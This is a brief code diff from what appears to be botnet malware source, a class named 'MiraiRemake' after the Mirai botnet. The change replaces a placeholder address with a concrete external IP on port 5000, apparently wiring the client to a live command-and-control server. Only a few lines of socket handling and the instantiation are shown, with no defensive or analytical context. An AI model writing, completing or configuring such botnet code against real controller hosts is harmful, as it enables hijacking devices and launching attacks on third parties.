@@ -97,7 +97,7 @@ class MiraiRemake:
 				socket_c.close()
 			except: print("Error")
 
-MiraiRemake("http://ip:5000")
+MiraiRemake("http://85.192.63.243:5000")
 
 
 
